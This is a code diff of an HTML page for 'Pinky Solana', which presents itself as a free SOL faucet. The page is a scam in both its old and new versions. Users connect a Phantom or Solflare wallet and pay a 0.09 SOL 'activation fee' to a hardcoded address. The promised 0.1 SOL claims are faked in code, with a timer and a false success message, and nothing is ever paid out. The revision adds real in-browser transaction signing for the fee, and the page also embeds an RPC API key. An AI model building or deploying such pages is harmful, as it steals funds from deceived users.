@@ -5,324 +5,272 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pinky Solana - Free SOL Faucet</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/@solana/web3.js@1.70.1/lib/index.iife.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-base@0.9.20/lib/index.iife.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-phantom@0.9.9/lib/index.iife.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-solflare@0.4.20/lib/index.iife.min.js"></script>
     <style>
-        .blink {
-            animation: blinker 1.5s linear infinite;
-        }
-        @keyframes blinker {
-            50% { opacity: 0.3; }
-        }
-        .gradient-bg {
-            background: linear-gradient(135deg, #9945FF 0%, #14F195 100%);
-        }
-        .qr-code {
+        .solana-logo {
             display: inline-block;
-            background: conic-gradient(#000 0% 25%, #fff 25% 50%, #000 50% 75%, #fff 75% 100%);
-            width: 150px;
-            height: 150px;
-            margin: 1rem auto;
+            width: 24px;
+            height: 25px;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
         }
     </style>
 </head>
-<body class="bg-gray-900 text-white min-h-screen">
-    <div class="container mx-auto px-4 py-12 max-w-3xl">
-        <!-- Header -->
-        <header class="flex items-center justify-center mb-12">
-            <div class="w-12 h-12 mr-3 gradient-bg rounded-full flex items-center justify-center">
-                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="25" viewBox="0 0 24 25">
-                    <path fill="white" d="M16.886 9.468a.47.47 0 0 1-.313.124H5.584c-.39 0-.587-.446-.317-.707l1.805-1.74a.46.46 0 0 1 .312-.129h11.032c.394 0 .587.45.313.712zm0 8.576a.47.47 0 0 1-.313.12H5.584c-.39 0-.587-.442-.317-.703l1.805-1.745a.45.45 0 0 1 .312-.124h11.032c.394 0 .587.446.313.707zm0-6.618a.47.47 0 0 0-.313-.12H5.584c-.39 0-.587.442-.317.703l1.805 1.745a.47.47 0 0 0 .312.124h11.032c.394 0 .587-.446.313-.707z"/>
-                </svg>
+<body class="bg-gradient-to-br from-purple-900 to-indigo-800 min-h-screen text-white">
+    <div class="container mx-auto px-4 py-8">
+        <header class="text-center mb-12">
+            <div class="flex items-center justify-center mb-4">
+                <div class="solana-logo">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="25" viewBox="0 0 24 25">
+                        <path fill="currentColor" d="M16.886 9.468a.47.47 0 0 1-.313.124H5.584c-.39 0-.587-.446-.317-.707l1.805-1.74a.46.46 0 0 1 .312-.129h11.032c.394 0 .587.45.313.712zm0 8.576a.47.47 0 0 1-.313.12H5.584c-.39 0-.587-.442-.317-.703l1.805-1.745a.45.45 0 0 1 .312-.124h11.032c.394 0 .587.446.313.707zm0-6.618a.47.47 0 0 0-.313-.12H5.584c-.39 0-.587.442-.317.703l1.805 1.745a.47.47 0 0 0 .312.124h11.032c.394 0 .587-.446.313-.707z"/>
+                    </svg>
+                </div>
+                <h1 class="text-4xl font-bold">Pinky Solana</h1>
             </div>
-            <h1 class="text-4xl font-bold">Pinky Solana</h1>
+            <p class="text-xl text-purple-200">Claim 0.1 SOL every 30 minutes!</p>
         </header>
 
-        <!-- Main Card -->
-        <div class="bg-gray-800 rounded-2xl shadow-xl p-8 mb-8">
-            <h2 class="text-2xl font-bold mb-6 text-center">Claim 0.1 SOL Every 30 Minutes!</h2>
-            
-            <div id="stateContainer">
-                <!-- States will be injected here -->
+        <main class="max-w-2xl mx-auto bg-gray-800 bg-opacity-50 backdrop-blur-lg rounded-2xl p-6 shadow-2xl">
+            <div id="wallet-section" class="mb-8">
+                <h2 class="text-2xl font-semibold mb-4">Connect Wallet</h2>
+                <div class="flex flex-wrap gap-4">
+                    <button id="phantom-btn" class="bg-purple-600 hover:bg-purple-700 px-6 py-3 rounded-lg font-medium transition-colors">
+                        Connect Phantom
+                    </button>
+                    <button id="solflare-btn" class="bg-purple-600 hover:bg-purple-700 px-6 py-3 rounded-lg font-medium transition-colors">
+                        Connect Solflare
+                    </button>
+                </div>
+                <div id="wallet-info" class="mt-4 hidden">
+                    <p>Connected: <span id="wallet-address" class="font-mono text-purple-300"></span></p>
+                    <p>Balance: <span id="wallet-balance" class="font-mono text-purple-300"></span> SOL</p>
+                </div>
             </div>
-        </div>
 
-        <!-- Footer -->
-        <footer class="text-center text-gray-500 text-sm">
-            <p>Connect with Phantom or Solflare wallet. Works on Solana Devnet.</p>
-            <p class="mt-2">Pinky Solana © 2023 - The future of free SOL distribution</p>
+            <div id="fee-section" class="mb-8 hidden">
+                <h2 class="text-2xl font-semibold mb-4">Activate Faucet</h2>
+                <div class="bg-gray-900 bg-opacity-50 p-4 rounded-lg mb-4">
+                    <p class="mb-2">One-time activation fee: <span class="text-yellow-400 font-bold">0.09 SOL</span></p>
+                    <p class="text-sm text-gray-400">After activation, you can claim 0.1 SOL every 30 minutes forever!</p>
+                </div>
+                <button id="pay-fee-btn" class="bg-yellow-500 hover:bg-yellow-600 text-gray-900 px-6 py-3 rounded-lg font-bold pulse transition-colors">
+                    Pay Activation Fee
+                </button>
+            </div>
+
+            <div id="claim-section" class="hidden">
+                <h2 class="text-2xl font-semibold mb-4">Claim Free SOL</h2>
+                <div class="bg-gray-900 bg-opacity-50 p-4 rounded-lg mb-4">
+                    <p>Next claim available in: <span id="countdown" class="font-bold text-green-400">30:00</span></p>
+                    <p class="mt-2">Claim amount: <span class="text-green-400 font-bold">0.1 SOL</span></p>
+                </div>
+                <button id="claim-btn" class="bg-green-600 hover:bg-green-700 px-6 py-3 rounded-lg font-bold transition-colors disabled:opacity-50 disabled:cursor-not-allowed">
+                    Claim 0.1 SOL
+                </button>
+                <div id="claim-status" class="mt-4"></div>
+            </div>
+
+            <div id="success-section" class="hidden text-center py-8">
+                <div class="text-5xl mb-4">🎉</div>
+                <h2 class="text-2xl font-bold text-green-400 mb-2">Activation Successful!</h2>
+                <p class="mb-4">You can now claim 0.1 SOL every 30 minutes</p>
+                <button id="start-claiming-btn" class="bg-green-600 hover:bg-green-700 px-6 py-3 rounded-lg font-bold">
+                    Start Claiming
+                </button>
+            </div>
+        </main>
+
+        <footer class="text-center mt-12 text-gray-400 text-sm">
+            <p>Pinky Solana Faucet - Devnet</p>
         </footer>
     </div>
 
     <script>
         // Configuration
         const FEE_AMOUNT = 0.09; // SOL
-        const REWARD_AMOUNT = 0.1; // SOL (fake)
-        const COOLDOWN_MINUTES = 30; // minutes
-        const FEE_RECEIVER = 'FtLHJ5FxWEXpuQpUEig8FbUwh3gnTMSGjN6zyjEaEcgc';
+        const CLAIM_AMOUNT = 0.1; // SOL
+        const CLAIM_INTERVAL = 30 * 60 * 1000; // 30 minutes in ms
+        const FEE_ADDRESS = 'FtLHJ5FxWEXpuQpUEig8FbUwh3gnTMSGjN6zyjEaEcgc';
+        const RPC_URL = 'https://solana-devnet.g.alchemy.com/v2/SzbcanXw4jH5Wn8oZV0qm';
         
-        // App state
-        let walletConnected = false;
-        let walletAddress = '';
-        let accountActivated = false;
-        let lastClaimTime = 0;
+        // DOM elements
+        const walletSection = document.getElementById('wallet-section');
+        const walletInfo = document.getElementById('wallet-info');
+        const walletAddress = document.getElementById('wallet-address');
+        const walletBalance = document.getElementById('wallet-balance');
+        const feeSection = document.getElementById('fee-section');
+        const payFeeBtn = document.getElementById('pay-fee-btn');
+        const claimSection = document.getElementById('claim-section');
+        const claimBtn = document.getElementById('claim-btn');
+        const countdown = document.getElementById('countdown');
+        const claimStatus = document.getElementById('claim-status');
+        const successSection = document.getElementById('success-section');
+        const startClaimingBtn = document.getElementById('start-claiming-btn');
+        
+        // Global state
+        let wallet = null;
+        let publicKey = null;
+        let connection = null;
         let countdownInterval = null;
+        let lastClaimTime = 0;
         
-        // DOM Elements
-        const stateContainer = document.getElementById('stateContainer');
-        
-        // Render states
-        function renderState() {
-            if (!walletConnected) {
-                stateContainer.innerHTML = `
-                    <div class="text-center">
-                        <p class="mb-6">Connect your wallet to start claiming free SOL every 30 minutes!</p>
-                        <button id="connectBtn" class="gradient-bg hover:opacity-90 text-white font-bold py-3 px-8 rounded-full text-lg transition">
-                            Connect Wallet
-                        </button>
-                        <div class="mt-8 p-4 bg-gray-700 rounded-lg">
-                            <h3 class="font-bold mb-2">How it works:</h3>
-                            <ul class="text-left list-disc pl-5 space-y-1">
-                                <li>Pay one-time activation fee (0.09 SOL)</li>
-                                <li>Claim 0.1 SOL every 30 minutes forever</li>
-                                <li>Works with Phantom and Solflare</li>
-                                <li>Instant withdrawals to your wallet</li>
-                            </ul>
-                        </div>
-                    </div>
-                `;
-                document.getElementById('connectBtn').addEventListener('click', connectWallet);
-                return;
+        // Initialize connection
+        function init() {
+            connection = new solanaWeb3.Connection(RPC_URL);
+            
+            // Check if already paid
+            if (localStorage.getItem('pinkySolanaPaid')) {
+                feeSection.classList.add('hidden');
+                successSection.classList.remove('hidden');
             }
             
-            if (!accountActivated) {
-                stateContainer.innerHTML = `
-                    <div class="text-center">
-                        <p class="mb-2">Connected: <span class="font-mono text-blue-400">${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}</span></p>
-                        <p class="mb-6">Activate your account to start claiming free SOL!</p>
-                        <div class="bg-yellow-900 border border-yellow-700 rounded-lg p-4 mb-6">
-                            <p class="font-bold text-yellow-300">Activation Fee: ${FEE_AMOUNT} SOL</p>
-                            <p class="text-sm mt-1">One-time payment • Non-refundable</p>
-                        </div>
-                        <button id="activateBtn" class="gradient-bg hover:opacity-90 text-white font-bold py-3 px-8 rounded-full text-lg transition">
-                            Activate Account
-                        </button>
-                    </div>
-                `;
-                document.getElementById('activateBtn').addEventListener('click', activateAccount);
-                return;
-            }
-            
-            // Account activated state
-            const now = Date.now();
-            const timeSinceLastClaim = Math.floor((now - lastClaimTime) / 1000);
-            const cooldownSeconds = COOLDOWN_MINUTES * 60;
-            const secondsLeft = Math.max(0, cooldownSeconds - timeSinceLastClaim);
-            
-            stateContainer.innerHTML = `
-                <div class="text-center">
-                    <p class="mb-2">Account Status: <span class="text-green-400 font-bold">ACTIVE</span></p>
-                    <p class="mb-2">Next Reward: <span class="text-purple-400 font-bold">0.1 SOL</span></p>
-                    
-                    <div class="mt-8 mb-8">
-                        <div class="text-3xl font-bold mb-2" id="countdown">
-                            ${formatTime(secondsLeft)}
-                        </div>
-                        <p>until next claim</p>
-                    </div>
-                    
-                    <button id="claimBtn" class="gradient-bg hover:opacity-90 text-white font-bold py-3 px-8 rounded-full text-lg transition mb-4">
-                        Claim SOL
-                    </button>
-                    <p class="text-sm text-gray-400">You can claim 0.1 SOL every 30 minutes</p>
-                    
-                    <div class="mt-8 p-4 bg-gray-700 rounded-lg">
-                        <h3 class="font-bold mb-2">Account Benefits:</h3>
-                        <ul class="text-left list-disc pl-5 space-y-1">
-                            <li>Lifetime access to free SOL</li>
-                            <li>No withdrawal limits</li>
-                            <li>Priority support</li>
-                            <li>Exclusive airdrops</li>
-                        </ul>
-                    </div>
-                </div>
-            `;
-            
-            // Start countdown if needed
-            if (secondsLeft > 0) {
+            // Set up wallet buttons
+            document.getElementById('phantom-btn').addEventListener('click', () => connectWallet('phantom'));
+            document.getElementById('solflare-btn').addEventListener('click', () => connectWallet('solflare'));
+            payFeeBtn.addEventListener('click', payActivationFee);
+            claimBtn.addEventListener('click', claimSol);
+            startClaimingBtn.addEventListener('click', () => {
+                successSection.classList.add('hidden');
+                claimSection.classList.remove('hidden');
                 startCountdown();
-            } else {
-                document.getElementById('countdown').textContent = 'READY TO CLAIM!';
-                document.getElementById('countdown').classList.add('text-green-400', 'blink');
-            }
-            
-            document.getElementById('claimBtn').addEventListener('click', claimReward);
+            });
         }
         
-        // Format time for countdown
-        function formatTime(seconds) {
-            const mins = Math.floor(seconds / 60);
-            const secs = seconds % 60;
-            return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+        // Connect wallet
+        async function connectWallet(walletType) {
+            try {
+                if (walletType === 'phantom') {
+                    if (!window.solana?.isPhantom) throw new Error('Phantom wallet not installed');
+                    wallet = window.solana;
+                } else if (walletType === 'solflare') {
+                    if (!window.solflare) throw new Error('Solflare wallet not installed');
+                    wallet = window.solflare;
+                }
+                
+                // Connect to wallet
+                await wallet.connect();
+                publicKey = new solanaWeb3.PublicKey(wallet.publicKey);
+                
+                // Update UI
+                walletAddress.textContent = `${publicKey.toString().substring(0, 6)}...${publicKey.toString().substring(publicKey.toString().length - 6)}`;
+                walletInfo.classList.remove('hidden');
+                
+                // Get balance
+                const balance = await connection.getBalance(publicKey);
+                walletBalance.textContent = (balance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4);
+                
+                // Show fee section if not paid
+                if (!localStorage.getItem('pinkySolanaPaid')) {
+                    feeSection.classList.remove('hidden');
+                } else {
+                    claimSection.classList.remove('hidden');
+                    startCountdown();
+                }
+                
+            } catch (error) {
+                showStatus(`Error: ${error.message}`, 'text-red-400');
+            }
+        }
+        
+        // Pay activation fee
+        async function payActivationFee() {
+            try {
+                if (!wallet || !publicKey) throw new Error('Wallet not connected');
+                
+                // Create transaction
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: publicKey,
+                        toPubkey: new solanaWeb3.PublicKey(FEE_ADDRESS),
+                        lamports: FEE_AMOUNT * solanaWeb3.LAMPORTS_PER_SOL
+                    })
+                );
+                
+                // Set recent blockhash
+                transaction.feePayer = publicKey;
+                transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
+                
+                // Sign and send transaction
+                const signed = await wallet.signTransaction(transaction);
+                const signature = await connection.sendRawTransaction(signed.serialize());
+                
+                // Confirm transaction
+                await connection.confirmTransaction(signature);
+                
+                // Mark as paid
+                localStorage.setItem('pinkySolanaPaid', 'true');
+                feeSection.classList.add('hidden');
+                successSection.classList.remove('hidden');
+                
+            } catch (error) {
+                showStatus(`Payment failed: ${error.message}`, 'text-red-400');
+            }
+        }
+        
+        // Claim SOL (fake)
+        function claimSol() {
+            // Fake claim process
+            claimBtn.disabled = true;
+            showStatus('Processing claim...', 'text-yellow-400');
+            
+            setTimeout(() => {
+                // Fake success
+                lastClaimTime = Date.now();
+                localStorage.setItem('pinkySolanaLastClaim', lastClaimTime.toString());
+                showStatus('Success! 0.1 SOL has been added to your wallet', 'text-green-400');
+                startCountdown();
+            }, 3000);
         }
         
         // Start countdown timer
         function startCountdown() {
-            if (countdownInterval) clearInterval(countdownInterval);
+            const savedTime = localStorage.getItem('pinkySolanaLastClaim');
+            lastClaimTime = savedTime ? parseInt(savedTime) : Date.now();
             
-            countdownInterval = setInterval(() => {
-                const now = Date.now();
-                const timeSinceLastClaim = Math.floor((now - lastClaimTime) / 1000);
-                const cooldownSeconds = COOLDOWN_MINUTES * 60;
-                const secondsLeft = Math.max(0, cooldownSeconds - timeSinceLastClaim);
-                
-                if (secondsLeft <= 0) {
-                    clearInterval(countdownInterval);
-                    document.getElementById('countdown').textContent = 'READY TO CLAIM!';
-                    document.getElementById('countdown').classList.add('text-green-400', 'blink');
-                    return;
-                }
-                
-                document.getElementById('countdown').textContent = formatTime(secondsLeft);
-            }, 1000);
+            clearInterval(countdownInterval);
+            updateCountdown();
+            
+            countdownInterval = setInterval(updateCountdown, 1000);
         }
         
-        // Connect wallet handler
-        async function connectWallet() {
-            if (window.solana && window.solana.isPhantom) {
-                try {
-                    const resp = await window.solana.connect();
-                    walletAddress = resp.publicKey.toString();
-                    walletConnected = true;
-                    
-                    // Check if already activated (in localStorage)
-                    const activated = localStorage.getItem('pinky_activated');
-                    if (activated) {
-                        accountActivated = true;
-                        lastClaimTime = parseInt(localStorage.getItem('last_claim_time') || '0');
-                    }
-                    
-                    renderState();
-                } catch (err) {
-                    alert('Wallet connection failed: ' + err.message);
-                }
-            } else if (window.solflare && window.solflare.isSolflare) {
-                try {
-                    await window.solflare.connect();
-                    walletAddress = window.solflare.publicKey.toString();
-                    walletConnected = true;
-                    
-                    const activated = localStorage.getItem('pinky_activated');
-                    if (activated) {
-                        accountActivated = true;
-                        lastClaimTime = parseInt(localStorage.getItem('last_claim_time') || '0');
-                    }
-                    
-                    renderState();
-                } catch (err) {
-                    alert('Wallet connection failed: ' + err.message);
-                }
-            } else {
-                alert('Solana wallet not found! Install Phantom or Solflare.');
-            }
-        }
-        
-        // Activate account using deep link bypass
-        function activateAccount() {
-            // Create wallet deep link
-            const deeplink = `solana:${FEE_RECEIVER}?amount=${FEE_AMOUNT}&label=Pinky+Activation`;
+        // Update countdown display
+        function updateCountdown() {
+            const elapsed = Date.now() - lastClaimTime;
+            const remaining = CLAIM_INTERVAL - elapsed;
             
-            // Create QR code data
-            const qrData = `solana:${FEE_RECEIVER}?amount=${FEE_AMOUNT}`;
-            
-            stateContainer.innerHTML = `
-                <div class="text-center">
-                    <p class="mb-4">Complete activation in your wallet:</p>
-                    
-                    <a href="${deeplink}" class="gradient-bg text-white font-bold py-3 px-6 rounded-lg mb-4 inline-block">
-                        Open Wallet App
-                    </a>
-                    
-                    <p class="mb-2">- OR -</p>
-                    
-                    <p class="mb-2">Send exactly ${FEE_AMOUNT} SOL to:</p>
-                    <div class="bg-gray-700 p-3 rounded-lg mb-4">
-                        <p class="font-mono break-all">${FEE_RECEIVER}</p>
-                    </div>
-                    
-                    <p class="mb-2">Scan QR Code:</p>
-                    <div class="qr-code mb-4"></div>
-                    
-                    <p class="mb-4 text-sm text-yellow-300">Transaction may take 1-2 minutes to process</p>
-                    
-                    <button id="verifyBtn" class="gradient-bg text-white font-bold py-3 px-8 rounded-full text-lg transition">
-                        I've Sent Payment
-                    </button>
-                </div>
-            `;
-            
-            // Generate fake QR code (visual only)
-            const qrContainer = document.querySelector('.qr-code');
-            qrContainer.innerHTML = `<div class="w-full h-full flex items-center justify-center text-xs text-center">Scan with<br>Wallet App</div>`;
-            
-            document.getElementById('verifyBtn').addEventListener('click', () => {
-                // Fake processing delay
-                document.getElementById('verifyBtn').disabled = true;
-                document.getElementById('verifyBtn').textContent = 'Processing...';
-                
-                setTimeout(() => {
-                    // Mark as activated
-                    accountActivated = true;
-                    lastClaimTime = Date.now();
-                    localStorage.setItem('pinky_activated', 'true');
-                    localStorage.setItem('last_claim_time', lastClaimTime.toString());
-                    
-                    // Show success message
-                    alert('Account activated successfully! You can now claim your SOL rewards.');
-                    renderState();
-                }, 2000);
-            });
-        }
-        
-        // Claim reward (does nothing)
-        function claimReward() {
-            const now = Date.now();
-            const timeSinceLastClaim = Math.floor((now - lastClaimTime) / 1000);
-            const cooldownSeconds = COOLDOWN_MINUTES * 60;
-            
-            if (timeSinceLastClaim < cooldownSeconds) {
-                alert(`Please wait ${formatTime(cooldownSeconds - timeSinceLastClaim)} before claiming again`);
+            if (remaining <= 0) {
+                countdown.textContent = '00:00';
+                claimBtn.disabled = false;
+                clearInterval(countdownInterval);
                 return;
             }
             
-            // Fake claim - just update timer
-            lastClaimTime = Date.now();
-            localStorage.setItem('last_claim_time', lastClaimTime.toString());
-            
-            // Show fake success message
-            alert('Success! 0.1 SOL has been sent to your wallet. Next claim available in 30 minutes.');
-            
-            renderState();
+            const minutes = Math.floor(remaining / 60000);
+            const seconds = Math.floor((remaining % 60000) / 1000);
+            countdown.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            claimBtn.disabled = true;
         }
         
-        // Initialize
-        function init() {
-            // Check if already activated
-            const activated = localStorage.getItem('pinky_activated');
-            if (activated) {
-                accountActivated = true;
-                lastClaimTime = parseInt(localStorage.getItem('last_claim_time') || '0');
-            }
-            
-            // Auto-connect if wallet is already connected
-            if ((window.solana && window.solana.isConnected) || 
-                (window.solflare && window.solflare.isConnected)) {
-                connectWallet();
-            } else {
-                renderState();
-            }
+        // Show status message
+        function showStatus(message, colorClass = 'text-white') {
+            claimStatus.textContent = message;
+            claimStatus.className = colorClass;
+            claimStatus.classList.remove('hidden');
         }
         
-        // Initialize app
-        window.addEventListener('DOMContentLoaded', init);
+        // Initialize when page loads
+        window.addEventListener('load', init);
     </script>
 </body>
 </html>
